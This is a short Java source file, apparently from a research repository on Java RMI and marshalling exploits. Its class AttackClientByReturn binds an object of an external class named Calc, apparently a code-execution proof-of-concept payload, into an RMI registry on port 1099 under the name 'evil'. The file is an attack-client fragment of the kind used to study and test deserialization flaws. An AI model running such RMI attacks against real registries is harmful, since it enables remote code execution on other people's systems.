package xyz.eki.marshalexp.rmi.attack;

import com.dr34d.Calc;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class AttackClientByReturn {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        Calc obj = new Calc();
        registry.bind("evil", obj);
    }
}
